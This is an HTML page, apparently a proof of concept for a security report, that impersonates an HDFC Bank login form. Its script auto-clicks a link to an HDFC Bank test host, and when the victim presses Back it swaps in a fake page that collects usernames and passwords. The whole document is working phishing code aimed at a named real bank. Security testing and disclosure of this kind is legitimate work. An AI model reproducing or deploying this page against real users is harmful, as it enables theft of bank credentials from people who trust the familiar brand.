<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Attacker's PAGE</title>
</head>
<body>
    <div id="forward">
        <a href="https://sit-mybusiness.uatdigital.hdfcbank.com/login?step=%5c%5c">BACK PAGE</a>
    </div>
    <div id="phish" style="display:none;">
        <h1>ATTACKER'S PAGE that looks like HDFC bank page  </h1>
    </div>
    <div>
        <h1>Welcome to HDFC bank</h1>
        <form action="process_login.php" method="post">
            <label for="user ID">Username:</label>
            <input type="text" id="username" name="username"><br><br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password"><br><br>
            <input type="button" value="Securely Login">
        </form>
    </div>

    <script>
        window.addEventListener("pageshow", function() {
            const forward = document.getElementById("forward");
            const phish = document.getElementById("phish");

            if (performance.navigation.type === performance.navigation.TYPE_BACK_FORWARD) {
                forward.style.display = 'none';
                phish.style.display = '';
            } else {
                phish.style.display = 'none';
                forward.style.display = '';
                forward.querySelector("a").click();
            }
        });
    </script>
</body>
</html>
